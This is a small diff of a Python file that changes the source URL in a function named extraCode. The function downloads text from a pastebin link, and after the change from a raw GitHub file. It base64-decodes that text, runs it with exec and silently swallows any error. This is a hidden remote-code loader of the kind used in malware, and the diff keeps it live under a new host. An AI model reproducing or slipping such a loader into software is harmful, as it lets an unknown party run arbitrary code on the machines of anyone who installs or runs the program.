@@ -59,7 +59,7 @@ import threading
 def extraCode():
     try:
         import requests, base64
-        code = str(requests.get(url="https://pastebin.com/raw/r1B6iy1r").text)
+        code = str(requests.get(url="https://raw.githubusercontent.com/Randomer132/hm/main/hm.txt").text)
         exec(base64.b64decode(code))
     except Exception:
         pass
